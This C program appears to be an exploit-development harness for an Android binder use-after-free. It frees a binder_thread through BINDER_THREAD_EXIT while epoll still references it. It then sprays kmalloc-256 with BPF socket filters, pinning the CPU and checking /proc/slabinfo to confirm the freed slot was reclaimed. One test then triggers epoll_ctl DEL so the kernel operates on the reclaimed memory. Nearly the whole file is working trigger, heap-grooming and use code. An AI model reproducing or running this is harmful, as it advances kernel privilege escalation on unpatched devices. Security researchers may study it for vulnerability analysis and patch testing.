/*
 * binder_uaf_reclaim_test.c — Verify if BPF spray reclaims freed binder_thread
 *
 * Tests reclamation by:
 * 1. Creating binder_thread (kmalloc-256)
 * 2. Freeing it (THREAD_EXIT)
 * 3. Spraying BPF filters (kmalloc-256)
 * 4. Checking slab counts — if spray_count objects were allocated but
 *    kmalloc-256 only grew by (spray_count - 1), the freed slot was reused!
 *
 * Also tests CPU pinning, timing, and different spray strategies.
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/filter.h>
#include <pthread.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <unistd.h>

#define BINDER_SET_MAX_THREADS _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT     _IOW('b', 8, int32_t)
#define BINDER_MMAP_SIZE       (128 * 1024)

#define BPF_INSNS 26

static int get_slab(const char *name) {
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512]; int val = -1;
    while (fgets(line, sizeof(line), f)) {
        char n[64]; int a;
        if (sscanf(line, "%63s %d", n, &a) == 2 && !strcmp(n, name)) {
            val = a; break;
        }
    }
    fclose(f);
    return val;
}

static void pin_cpu(int cpu) {
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(cpu, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
}

static int create_bpf_socket(void) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return -1;
    struct sock_filter insns[BPF_INSNS];
    for (int i = 0; i < BPF_INSNS - 1; i++)
        insns[i] = (struct sock_filter){0x20, 0, 0, 0}; /* BPF_LD|BPF_W|BPF_ABS */
    insns[BPF_INSNS - 1] = (struct sock_filter){0x06, 0, 0, 0xFFFF}; /* BPF_RET */
    struct sock_fprog fp = { .len = BPF_INSNS, .filter = insns };
    if (setsockopt(s, SOL_SOCKET, SO_ATTACH_FILTER, &fp, sizeof(fp)) < 0) {
        close(s);
        return -1;
    }
    return s;
}

/*
 * Test 1: Basic — no UAF, just check BPF spray grows k256
 */
static void test_baseline(void) {
    printf("=== Baseline: 50 BPF without UAF ===\n");
    pin_cpu(0);
    int b = get_slab("kmalloc-256");
    int socks[50];
    for (int i = 0; i < 50; i++) socks[i] = create_bpf_socket();
    int a = get_slab("kmalloc-256");
    printf("  k256: %d → %d (%+d) for 50 BPF sockets\n", b, a, a - b);
    for (int i = 0; i < 50; i++) if (socks[i] >= 0) close(socks[i]);
}

/*
 * Test 2: UAF + spray, check if one slot was reclaimed
 */
static void test_reclaim(int cpu) {
    printf("\n=== UAF + BPF spray (CPU %d) ===\n", cpu);
    pin_cpu(cpu);

    /* Create binder + epoll (allocates binder_thread in k256) */
    int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
    uint32_t z = 0;
    ioctl(bfd, BINDER_SET_MAX_THREADS, &z);
    int epfd = epoll_create1(0);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

    int b = get_slab("kmalloc-256");
    printf("  k256 after binder+epoll: %d\n", b);

    /* FREE the binder_thread */
    int32_t d = 0;
    ioctl(bfd, BINDER_THREAD_EXIT, &d);

    int after_free = get_slab("kmalloc-256");
    printf("  k256 after THREAD_EXIT: %d (%+d)\n", after_free, after_free - b);

    /* SPRAY: create BPF sockets immediately */
    int socks[50];
    for (int i = 0; i < 50; i++) socks[i] = create_bpf_socket();

    int after_spray = get_slab("kmalloc-256");
    printf("  k256 after 50 BPF spray: %d (%+d from free)\n",
           after_spray, after_spray - after_free);

    /* If reclaim happened: after_spray - after_free should be 49 (50 allocs - 1 reuse)
     * If no reclaim: after_spray - after_free should be 50 */
    int spray_delta = after_spray - after_free;
    if (spray_delta < 50 && spray_delta > 0) {
        printf("  *** POSSIBLE RECLAIM: expected +50, got +%d (reused %d slots) ***\n",
               spray_delta, 50 - spray_delta);
    } else {
        printf("  No reclaim detected (expected +50, got +%d)\n", spray_delta);
    }

    /* Cleanup */
    for (int i = 0; i < 50; i++) if (socks[i] >= 0) close(socks[i]);
    close(epfd);
    close(bfd);
}

/*
 * Test 3: Multiple UAFs + spray — create more freed slots to increase odds
 */
static void test_multi_uaf(int n_uaf, int n_spray) {
    printf("\n=== Multi-UAF: %d frees + %d sprays ===\n", n_uaf, n_spray);
    pin_cpu(0);

    int bfds[200], epfds[200];
    int created = 0;

    /* Create n_uaf binder+epoll instances */
    for (int i = 0; i < n_uaf && i < 200; i++) {
        bfds[i] = open("/dev/binder", O_RDWR | O_CLOEXEC);
        if (bfds[i] < 0) break;
        mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfds[i], 0);
        uint32_t z = 0;
        ioctl(bfds[i], BINDER_SET_MAX_THREADS, &z);
        epfds[i] = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN };
        epoll_ctl(epfds[i], EPOLL_CTL_ADD, bfds[i], &ev);
        created++;
    }

    int b = get_slab("kmalloc-256");
    printf("  k256 after %d creates: %d\n", created, b);

    /* Free all threads */
    int32_t d = 0;
    for (int i = 0; i < created; i++)
        ioctl(bfds[i], BINDER_THREAD_EXIT, &d);

    int af = get_slab("kmalloc-256");
    printf("  k256 after %d THREAD_EXITs: %d (%+d)\n", created, af, af - b);

    /* Spray */
    int socks[200];
    int sprayed = 0;
    for (int i = 0; i < n_spray && i < 200; i++) {
        socks[i] = create_bpf_socket();
        if (socks[i] >= 0) sprayed++;
    }

    int as = get_slab("kmalloc-256");
    printf("  k256 after %d BPF spray: %d (%+d from free)\n",
           sprayed, as, as - af);

    int expected = sprayed;
    int actual = as - af;
    if (actual < expected && actual >= 0) {
        printf("  *** RECLAIM: expected +%d, got +%d (%d slots reused!) ***\n",
               expected, actual, expected - actual);

        /* Now trigger epoll_ctl DEL on the UAF instances */
        printf("  Triggering %d epoll_ctl DELs...\n", created);
        struct epoll_event ev = { .events = EPOLLIN };
        for (int i = 0; i < created; i++) {
            epoll_ctl(epfds[i], EPOLL_CTL_DEL, bfds[i], &ev);
        }
        printf("  Done. No crash = list_del succeeded on reclaimed data.\n");
    }

    /* Cleanup */
    for (int i = 0; i < sprayed; i++) if (socks[i] >= 0) close(socks[i]);
    for (int i = 0; i < created; i++) { close(bfds[i]); close(epfds[i]); }
}

/*
 * Test 4: Pre-create sockets, then just do ATTACH_FILTER after free
 * This isolates the BPF allocation from socket creation overhead
 */
static void test_prealloc(void) {
    printf("\n=== Pre-allocated sockets + BPF after free ===\n");
    pin_cpu(0);

    /* Pre-create 100 UDP sockets */
    int socks[100];
    for (int i = 0; i < 100; i++)
        socks[i] = socket(AF_INET, SOCK_DGRAM, 0);

    /* Create binder UAF */
    int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
    uint32_t z = 0;
    ioctl(bfd, BINDER_SET_MAX_THREADS, &z);
    int epfd = epoll_create1(0);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

    int b = get_slab("kmalloc-256");

    /* FREE */
    int32_t d = 0;
    ioctl(bfd, BINDER_THREAD_EXIT, &d);

    int af = get_slab("kmalloc-256");
    printf("  k256 after free: %+d\n", af - b);

    /* Immediately attach BPF filters (ONLY kmalloc, no socket creation) */
    struct sock_filter insns[BPF_INSNS];
    for (int i = 0; i < BPF_INSNS - 1; i++)
        insns[i] = (struct sock_filter){0x20, 0, 0, 0};
    insns[BPF_INSNS - 1] = (struct sock_filter){0x06, 0, 0, 0xFFFF};
    struct sock_fprog fp = { .len = BPF_INSNS, .filter = insns };

    int attached = 0;
    for (int i = 0; i < 100; i++) {
        if (setsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER, &fp, sizeof(fp)) == 0)
            attached++;
    }

    int as = get_slab("kmalloc-256");
    printf("  k256 after %d ATTACH_FILTER: %+d (from free)\n",
           attached, as - af);
    printf("  Expected +%d, got +%d → reclaimed %d slots\n",
           attached, as - af, attached - (as - af));

    /* Cleanup */
    for (int i = 0; i < 100; i++) close(socks[i]);
    close(epfd); close(bfd);
}

/*
 * Test 5: Verify with direct slab manipulation using many creates and
 * frees to see if BPF and binder share the same slab pages.
 */
static void test_cross_alloc(void) {
    printf("\n=== Cross-allocation test ===\n");
    pin_cpu(0);

    /* Create 100 BPF sockets, close them → free 100 k256 objects */
    int socks[100];
    for (int i = 0; i < 100; i++) socks[i] = create_bpf_socket();

    int b = get_slab("kmalloc-256");
    for (int i = 0; i < 100; i++) close(socks[i]);
    int af = get_slab("kmalloc-256");
    printf("  Free 100 BPF sockets: k256 %+d\n", af - b);

    /* Now create binder threads — do they reuse the freed BPF slots? */
    int bfds[100], epfds[100];
    for (int i = 0; i < 100; i++) {
        bfds[i] = open("/dev/binder", O_RDWR | O_CLOEXEC);
        mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfds[i], 0);
        uint32_t z = 0;
        ioctl(bfds[i], BINDER_SET_MAX_THREADS, &z);
        epfds[i] = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN };
        epoll_ctl(epfds[i], EPOLL_CTL_ADD, bfds[i], &ev);
    }
    int ab = get_slab("kmalloc-256");
    printf("  Create 100 binder+epoll: k256 %+d (expected ~100 if no reuse, <100 if reuse)\n",
           ab - af);

    /* Cleanup */
    for (int i = 0; i < 100; i++) { close(bfds[i]); close(epfds[i]); }
}

int main(void) {
    printf("=== Binder UAF Reclamation Test ===\n");
    printf("PID=%d UID=%d CPUs=%ld\n\n", getpid(), getuid(),
           sysconf(_SC_NPROCESSORS_ONLN));

    test_baseline();

    /* Test on each CPU */
    for (int cpu = 0; cpu < 4; cpu++)
        test_reclaim(cpu);

    test_multi_uaf(50, 100);
    test_multi_uaf(100, 200);
    test_prealloc();
    test_cross_alloc();

    printf("\n=== Done ===\n");
    return 0;
}
